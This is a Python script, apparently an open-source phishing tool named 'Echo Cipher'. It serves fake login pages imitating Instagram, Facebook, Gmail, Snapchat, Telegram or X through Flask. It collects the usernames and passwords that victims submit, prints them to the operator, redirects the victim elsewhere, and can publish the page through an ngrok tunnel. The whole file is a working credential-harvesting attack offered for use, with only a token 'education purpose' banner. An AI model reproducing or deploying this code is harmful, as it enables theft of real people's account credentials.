import logging
from importlib import import_module as eximport
from subprocess import run
import os, platform, time


def cleaar():
    if platform.system() == "Windows":
        os.system("cls") 

    else:
        os.system("clear")

cleaar()

green="\033[0;32m"
purple="\033[0;35m"
red="\033[0;31m"
byellow="\033[1;33m"

modules = ["flask", "pyngrok", "termcolor", "pyfiglet", "requests"]

for module in modules:
    try:
        eximport(module)

    except ImportError:
        try:
            print(f"{green} Installing {module} {purple}")
            run(f"pip3 install {module}", shell=True)
            time.sleep(1)
            cleaar()

        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)

    except:
        exit(1)


from flask import Flask, render_template, abort, redirect, request
from pyngrok import ngrok
import termcolor, random, pyfiglet
from requests import head
from requests.exceptions import ConnectionError


def is_internet():
    try:
        head("https://google.com", timeout=5)
        print(f"\n{green}Network Working!")
        return True

    except ConnectionError:
            print(f"\n{purple}No internet!\a")
            time.sleep(2)
            return False

    except Exception as e:
        print(termcolor.colored(f"{str(e)}", "red"))
        return False


app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

print(termcolor.colored("\n\nUsed for education purpose Only! \n", "red", "on_yellow"))
print(termcolor.colored("Python Phisher Initializing... \n", "yellow", "on_green"))
text = [".ECHO", ".ECHO CIPHER", ".Echo Cipher"]
text = random.choice(text)
ascii_art = pyfiglet.figlet_format(text)
color = ["green", "yellow", "white", "cyan", "blue", "light_red", "magenta"]
print(termcolor.colored(ascii_art, random.choice(color)))

print(f"{red}                                 Github:-https://github.com/Arp1it")

print(f"\n\n{purple}--> insta → Instagram")
print(f"{green}--> meta → Facebook")
print(f"{purple}--> gmail → Gmail")
print(f"{green}--> snap → Snapchat")
print(f"{purple}--> tele → Telegram")
print(f"{green}--> x → Twitter")
print(f"\n{red}More Features Are Comming Soon!\n")

chhosse = input((f"{green}Enter here {byellow}(insta, meta, etc.): ")).lower()

optiosn = {
        "insta": "instagram.html",
        "meta": "facebook.html",
        "gmail": "gmail.html",
        "snap": "snapchat.html",
        "tele": "telegram.html",
        "x": "x.html",
    }

if chhosse in optiosn:
    pass

else:
    # abort(404)
    # raise ValueError(f"{e} not exists this type of Phishing page!")
    print(termcolor.colored("\nInvalid input! Please choose a valid phishing page type.", "red"))
    exit()

try:
    por = int(input(termcolor.colored("Enter port number here (Default port - 8096): ", "cyan")))

    if por == "":
        por = 8096

except:
    por = 8096


custom_url = input(f"\n{purple}Enter Custom Url: ")


@app.route("/")
def hello_world():
    
    return render_template(f"{optiosn[chhosse]}")


@app.route("/getdetails", methods=["POST"])
def getdetails():
    
    if request.method == "POST":
        user = request.form.get("username")
        passw = request.form.get("password")

        print(f"\n\n{byellow}[+] User: {user}\n[+] Password: {passw}")

        return redirect(custom_url)


if __name__ == "__main__":
    sss = input(termcolor.colored("\n\nAre you want we start ngrok or you start itself Y for yes N for no!: ", "red"))

    aa = is_internet()

    if sss.lower() == "y" and aa:
        en = input(termcolor.colored("\nEnter ngrok authtoken: ", "blue"))
        
        try:
            public_url = ngrok.connect(por, "http")

        except Exception as e:
            print(f"\n{byellow}ERROR: {red}{str(e)}")

        print(termcolor.colored(f"\n* Running on http://127.0.0.1:{por} \n", "light_green"))
        print(termcolor.colored(f"Public URL: {public_url} \n\n", "light_green"))

    else:
        print(termcolor.colored(f"\n* Running on http://127.0.0.1:{por} \n", "light_green"))

    app.run(port=por)


# Note - Whatsapp qr phishing page and getting otp (Comming Soon!)